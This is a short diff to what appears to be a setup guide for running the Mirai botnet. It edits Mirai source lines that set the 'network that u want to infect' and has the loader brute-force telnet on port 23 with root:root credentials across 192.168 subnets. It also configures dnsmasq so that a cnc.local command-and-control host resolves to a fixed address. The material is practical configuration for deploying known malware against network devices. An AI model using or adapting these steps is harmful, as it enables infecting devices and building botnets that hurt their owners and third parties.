@@ -6,7 +6,7 @@
 +    addr.sin_addr.s_addr = INET_ADDR(192,168,1,55);   // IP of the dns
 +    return INET_ADDR(192,168,o3,o4); // the network that u want to infect
 
-2. **mirai/bot/src/main.c :**
+2. **mirai/loader/src/main.c :**
 
 - snprintf(strbuf, sizeof(strbuf), "192.168.1.%d:23 root:root", i); // the network that u want to infect
 - snprintf(strbuf, sizeof(strbuf), "192.168.%d.%d:23 root:root", o3, o4); // the network that u want to infect
@@ -35,7 +35,7 @@ sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts
 # Configure DNS
 sudo systemctl stop systemd-resolved
 sudo systemctl disable systemd-resolved
-echo "address=/cnc.local/192.168.1.56" | sudo tee -a /etc/dnsmasq.conf
+echo "address=/cnc.local/172.16.237.235" | sudo tee -a /etc/dnsmasq.conf
 sudo systemctl enable dnsmasq
 sudo systemctl start dnsmasq
 
